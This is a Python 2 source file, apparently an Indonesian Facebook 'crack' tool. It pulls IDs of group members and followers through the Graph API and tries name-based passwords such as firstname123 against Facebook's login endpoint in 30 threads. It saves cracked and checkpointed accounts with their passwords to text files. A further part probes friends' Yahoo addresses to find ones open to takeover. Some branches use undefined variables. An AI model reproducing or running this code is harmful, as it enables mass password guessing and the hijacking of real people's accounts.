	print ("\033[1;94m──────────────────────────────────────────────────")
	
##### MAIN LIKES #####
	def main(arg):
		sys.stdout.write("\r{}".format(datetime.now().strftime("\033[1;96m%H\033[1;91m:\033[1;93m%M\033[1;91m:\033[1;92m%S")));sys.stdout.flush()
		global cekpoint,oks
		zowe = arg
		try:
			os.mkdir('done')
		except OSError:
			pass
		try:
			an = requests.get('https://graph.facebook.com/'+zowe+'/?access_token='+toket)
			j = json.loads(an.text)
			bos1 = j['first_name'].lower()+'123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			ko = json.load(data)
			if 'access_token' in ko:
				print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
				print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
				print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
				print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos1
				oke = open("done/grup.txt", "a")
				oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos1+"\n")
				oke.close()
				oks.append(zowe)
			else:
				if 'www.facebook.com' in ko['error_msg']:
					print ("\n\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} \x1b[1;96mCEKPOINT")
					print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m") + j['name']
					print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m") + zowe
					print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m") + bos1
					cek = open("done/grup.txt", "a")
					cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos1+"\n")
					cek.close()
					cekpoint.append(zowe)
				else:
					bos2 = j['first_name'].lower()+'1234'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					ko = json.load(data)
					if 'access_token' in ko:
						print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
						print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
						print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
						print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos2
						oke = open("done/grup.txt", "a")
						oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos2+"\n")
						oke.close()
						oks.append(zowe)
					else:
						if 'www.facebook.com' in ko['error_msg']:
							print ("\n\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} \x1b[1;96mCEKPOINT")
							print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m") + j['name']
							print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m") + zowe
							print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m") + bos2
							cek = open("done/grup.txt", "a")
							cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos2+"\n")
							cek.close()
							cekpoint.append(zowe)
						else:
							bos3 = j['first_name'].lower()+'12345'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							ko = json.load(data)
							if 'access_token' in ko:
								print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
								print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
								print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
								print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos3
								oke = open("done/grup.txt", "a")
								oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos3+"\n")
								oke.close()
								oks.append(zowe)
							else:
								if 'www.facebook.com' in ko['error_msg']:
									print ("\n\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} \x1b[1;96mCEKPOINT")
									print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m") + j['name']
									print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m") + zowe
									print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m") + bos3
									cek = open("done/grup.txt", "a")
									cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos3+"\n")
									cek.close()
									cekpoint.append(zowe)
								else:
									bos4 = j['last_name'].lower()+'123'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									ko = json.load(data)
									if 'access_token' in ko:
										print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
										print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
										print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
										print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos4
										oke = open("done/grup.txt", "a")
										oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos4+"\n")
										oke.close()
										oks.append(zowe)
									else:
										if 'www.facebook.com' in ko['error_msg']:
											print ("\n\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} \x1b[1;96mCEKPOINT")
											print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m") + j['name']
											print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m") + zowe
											print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m") + bos4
											cek = open("done/grup.txt", "a")
											cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos4+"\n")
											cek.close()
											cekpoint.append(zowe)
										else:
											bos5 = j['last_name'].lower()+'1234'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											ko = json.load(data)
											if 'access_token' in ko:
												print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
												print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
												print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
												print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos5
												oke = open("done/grup.txt", "a")
												oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos5+"\n")
												oke.close()
												oks.append(zowe)
											else:
												if 'www.facebook.com' in ko['error_msg']:
													print ("\n\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} \x1b[1;96mCEKPOINT")
													print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m") + j['name']
													print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m") + zowe
													print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m") + bos5
													cek = open("done/grup.txt", "a")
													cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos5+"\n")
													cek.close()
													cekpoint.append(zowe)
												else:
													bos6 = j['last_name'].lower()+'12345'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													ko = json.load(data)
													if 'access_token' in ko:
														print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
														print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
														print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
														print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos6
														oke = open("done/grup.txt", "a")
														oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos6+"\n")
														oke.close()
														oks.append(zowe)
													else:
														if 'www.facebook.com' in ko['error_msg']:
															print ("\n\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} \x1b[1;96mCEKPOINT")
															print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m") + j['name']
															print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m") + zowe
															print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m") + bos6
															cek = open("done/grup.txt", "a")
															cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos6+"\n")
															cek.close()
															cekpoint.append(zowe)
																			
		except:
			pass
			
	p = ThreadPool(30)
	p.map(main, id)
	print "\n\033[1;94m──────────────────────────────────────────────────"
	print '\033[1;97m{\033[1;96m●\033[1;97m} \033[1;96mSelesai ...'
	print"\033[1;97m{\033[1;96m●\033[1;97m} \033[1;96mTotal \033[1;92mOK\033[1;97m/\x1b[1;96mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;96m"+str(len(cekpoint))
	print '\033[1;97m{\033[1;96m●\033[1;97m} \033[1;92mOK\033[1;97m/\x1b[1;96mCP \033[1;96mfile tersimpan \033[1;91m: \033[1;92mdone/grup.txt'
	print 50* "\033[1;94m─"
	raw_input("\033[1;97m{<\033[1;96mKembali\033[1;97m>}")
	os.system("python2 cr4ck.py")
	
##### CRACK FOLLOW #####
def crack_follow():
	toket=open('login.txt','r').read()
	os.system('clear')
	print logo
	print 50* "\033[1;94m─"
	print ("              \033[1;95m●●● \033[1;97mCRACK FOLLOWERS \033[1;95m●●●")
	print 50* "\033[1;94m─"
	idt = raw_input("\033[1;97m{\033[1;95m●\033[1;97m} \033[1;95mID Publik/Teman \033[1;91m:\033[1;92m ")
	try:
		jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
		op = json.loads(jok.text)
		print"\033[1;97m{\033[1;95m●\033[1;97m} \033[1;95mNama \033[1;91m:\033[1;92m "+op["name"]
	except KeyError:
		print"\033[1;97m{\033[1;91m!\033[1;97m} ID publik/teman tidak ada !"
		raw_input("\n\033[1;95m[\033[1;97m<Kembali>\033[1;95m]")
		menu()
	except requests.exceptions.ConnectionError:
		print"\033[1;97m{\033[1;91m!\033[1;97m} Tidak ada koneksi !"
		keluar()
	r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=999999&access_token="+toket)
	z = json.loads(r.text)
	for i in z['data']:
		id.append(i['id'])
		
	print "\033[1;97m{\033[1;95m●\033[1;97m} \033[1;95mTotal ID Followers \033[1;91m:\033[1;92m "+str(len(id))
	print('\033[1;97m{\033[1;95m●\033[1;97m} \033[1;95mStop Tekan CTRL+Z')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;97m{\033[1;95m●\033[1;97m} \033[1;95mCrack Berjalan "+o),;sys.stdout.flush();time.sleep(1)
	print("\n\033[1;97m{\033[1;95m●\033[1;97m} \033[1;95mGunakan Mode Pesawat Jika Tidak Ada Hasil")
	print ("\033[1;94m──────────────────────────────────────────────────")
	
##### MAIN FOLLOW #####
	def main(arg):
		sys.stdout.write("\r{}".format(datetime.now().strftime("\033[1;96m%H\033[1;91m:\033[1;93m%M\033[1;91m:\033[1;92m%S")));sys.stdout.flush()
		global cekpoint,oks
		zowe = arg
		try:
			os.mkdir('done')
		except OSError:
			pass
		try:
			an = requests.get('https://graph.facebook.com/'+zowe+'/?access_token='+toket)
			j = json.loads(an.text)
			bos1 = j['first_name'].lower()+'123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			ko = json.load(data)
			if 'access_token' in ko:
				print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
				print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user
				print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass1 + '\n'
				print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']
				oke = open("done/follow.txt", "a")
				oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +user+ "\n{×} Password > " +pass1+"\n")
				oke.close()
				oks.append(zowe)
			else:
				if 'www.facebook.com' in ko['error_msg']:
					print ("\n\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} \x1b[1;95mCEKPOINT")
					print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user
					print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass1 + '\n'
					print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']
					cek = open("done/follow.txt", "a")
					cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +user+ "\n{×} Password > " +pass1+"\n")
					cek.close()
					cekpoint.append(zowe)
				else:
					bos2 = j['first_name'].lower()+'1234'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					ko = json.load(data)
					if 'access_token' in ko:
						print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
						print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user
						print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass2 + '\n'
						print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']
						oke = open("done/follow.txt", "a")
						oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +user+ "\n{×} Password > " +pass2+"\n")
						oke.close()
						oks.append(zowe)
					else:
						if 'www.facebook.com' in ko['error_msg']:
							print ("\n\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} \x1b[1;95mCEKPOINT")
							print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user
							print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass2 + '\n'
							print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']
							cek = open("done/follow.txt", "a")
							cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +user+ "\n{×} Password > " +pass2+"\n")
							cek.close()
							cekpoint.append(zowe)
						else:
							bos3 = j['first_name'].lower()+'12345'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							ko = json.load(data)
							if 'access_token' in ko:
								print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
								print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user
								print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass3 + '\n'
								print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']
								oke = open("done/follow.txt", "a")
								oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +user+ "\n{×} Password > " +pass3+"\n")
								oke.close()
								oks.append(zowe)
							else:
								if 'www.facebook.com' in ko['error_msg']:
									print ("\n\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} \x1b[1;95mCEKPOINT")
									print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user
									print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass6 + '\n'
									print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']
									cek = open("done/follow.txt", "a")
									cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +user+ "\n{×} Password > " +pass3+"\n")
									cek.close()
									cekpoint.append(zowe)
								else:
									bos4 = j['last_name'].lower()+'123'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									ko = json.load(data)
									if 'access_token' in ko:
										print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
										print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user
										print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass4 + '\n'
										print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']
										oke = open("done/follow.txt", "a")
										oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +user+ "\n{×} Password > " +pass4+"\n")
										oke.close()
										oks.append(zowe)
									else:
										if 'www.facebook.com' in ko['error_msg']:
											print ("\n\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} \x1b[1;95mCEKPOINT")
											print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user
											print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass4 + '\n'
											print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']
											cek = open("done/follow.txt", "a")
											cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +user+ "\n{×} Password > " +pass4+"\n")
											cek.close()
											cekpoint.append(zowe)
										else:
											bos5 = j['last_name'].lower()+'1234'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											ko = json.load(data)
											if 'access_token' in ko:
												print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
												print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user
												print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass5 + '\n'
												print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']
												oke = open("done/follow.txt", "a")
												oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +user+ "\n{×} Password > " +pass5+"\n")
												oke.close()
												oks.append(zowe)
											else:
												if 'www.facebook.com' in ko['error_msg']:
													print ("\n\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} \x1b[1;95mCEKPOINT")
													print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user
													print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass5 + '\n'
													print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']
													cek = open("done/follow.txt", "a")
													cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +user+ "\n{×} Password > " +pass5+"\n")
													cek.close()
													cekpoint.append(zowe)
												else:
													bos6 = j['last_name'].lower()+'12345'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													ko = json.load(data)
													if 'access_token' in ko:
														print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
														print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user
														print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass6 + '\n'
														print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']
														oke = open("done/follow.txt", "a")
														oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +user+ "\n{×} Password > " +pass6+"\n")
														oke.close()
														oks.append(zowe)
													else:
														if 'www.facebook.com' in ko['error_msg']:
															print ("\n\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} \x1b[1;95mCEKPOINT")
															print '\x1c\033[1;94m[✴] \x1c\033[1;94mName \x1c\033[1;94m    : \x1c\033[1;95m' + c['name']
															print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user
															print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass6 + '\n'
															print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']
															cek = open("done/follow.txt", "a")
															cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +user+ "\n{×} Password > " +pass6+"\n")
															cek.close()
															cekpoint.append(zowe)
																			
		except:
			pass
			
	p = ThreadPool(30)
	p.map(main, id)
	print "\n\033[1;94m──────────────────────────────────────────────────"
	print '\033[1;97m{\033[1;95m●\033[1;97m} \033[1;95mSelesai ...'
	print"\033[1;97m{\033[1;95m●\033[1;97m} \033[1;95mTotal \033[1;92mOK\033[1;97m/\x1b[1;95mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;95m"+str(len(cekpoint))
	print '\033[1;97m{\033[1;95m●\033[1;97m} \033[1;92mOK\033[1;97m/\x1b[1;95mCP \033[1;95mfile tersimpan \033[1;91m: \033[1;92mdone/follow.txt'
	print 50* "\033[1;94m─"
	raw_input("\033[1;97m{<\033[1;95mKembali\033[1;97m>}")
	os.system("python2 cr4ck.py")
	
##### USERNAME ID ####
def user_id():
	os.system('clear')
	print logo
	print 50* "\033[1;94m─"
	ling = ('https://www.facebook.com/')
	url = ling+raw_input("\033[1;97m{\033[1;95m×\033[1;97m} Username : ")
	idre = re.compile('"entity_id":"([0-9]+)"')
	page = requests.get(url)
	print idre.findall(page.content)
	raw_input("\n\033[1;95m[\033[1;97m<Kembali>\033[1;95m]")
	menu()
	
##### YAHOO #####
def yahoo():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	os.system('clear')
	print logo
	print 42*"\033[1;96m="
	print "\x1b[1;97m1.\x1b[1;93m Clone dari daftar teman"
	print "\x1b[1;97m2.\x1b[1;93m Clone dari teman"
	print "\x1b[1;97m3.\x1b[1;93m Clone dari member group"
	print "\x1b[1;97m4.\x1b[1;93m Clone dari file"
	print "\n\x1b[1;91m0.\x1b[1;91m Kembali"
	clone()
       
def clone():
	embuh = raw_input("\n\x1b[1;97m >>> ")
	if embuh =="":
		print "\033[1;96m[!] \x1b[1;91mIsi yang benar"
	elif embuh =="1":
		clone_dari_daftar_teman()
	elif embuh =="2":
		clone_dari_teman()
	elif embuh =="3":
		clone_dari_member_group()
	elif embuh =="4":
		clone_dari_file()
	elif embuh =="0":
		menu()
	else:
		print "\033[1;96m[!] \x1b[1;91mIsi yang benar"
		

def clone_dari_daftar_teman():
	global toket 
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token Invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	try:
		os.mkdir('out')
	except OSError:
		pass
	os.system('clear')
	print logo
	mpsh = []
	jml = 0
	print 42*"\033[1;96m="
	jalan('\033[1;96m[\x1b[1;97m✺\x1b[1;96m] \033[1;93mMengambil email \033[1;97m...')
	teman = requests.get('https://graph.facebook.com/me/friends?access_token='+toket)
	kimak = json.loads(teman.text)
	jalan('\033[1;96m[\x1b[1;97m✺\x1b[1;96m] \033[1;93mStart \033[1;97m...')
	print ('\x1b[1;96m[!] \x1b[1;93mStop CTRL+z')
	print 42*"\033[1;96m="
	for w in kimak['data']:
		jml +=1
		mpsh.append(jml)
		id = w['id']
		nama = w['name']
		links = requests.get("https://graph.facebook.com/"+id+"?access_token="+toket)
		z = json.loads(links.text)
		try:
			mail = z['email']
			yahoo = re.compile(r'@.*')
			otw = yahoo.search(mail).group()
			if 'yahoo.com' in otw:
				br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
				br._factory.is_html = True
				br.select_form(nr=0)
				br["username"] = mail
				klik = br.submit().read()
				jok = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
				try:
					pek = jok.search(klik).group()
				except:
					continue
				if '"messages.ERROR_INVALID_USERNAME">' in pek:
					print("\033[1;96m[✓] \033[1;92mVULN")
					print("\033[1;96m[➹] \033[1;97mID   \033[1;91m: \033[1;92m"+id)
					print("\033[1;96m[➹] \033[1;97mEmail\033[1;91m: \033[1;92m"+mail)
